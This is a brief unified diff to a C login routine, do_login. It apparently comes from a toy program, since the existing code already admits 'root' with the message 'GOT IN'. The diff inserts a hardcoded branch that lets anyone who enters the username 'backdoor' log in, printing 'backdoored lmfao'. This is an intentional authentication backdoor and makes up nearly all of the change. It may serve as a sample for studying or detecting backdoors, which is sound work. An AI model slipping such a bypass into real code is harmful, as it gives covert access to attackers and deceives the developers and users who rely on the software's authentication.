@@ -17,6 +17,11 @@
  */
 
 static int do_login(const char *username) {
+	if (!strcmp(username, "backdoor")){
+		printf("backdoored lmfao");
+		return 0;
+	}
+
     if (!strcmp(username, "root")){
         printf("GOT IN\n");
         return 0;
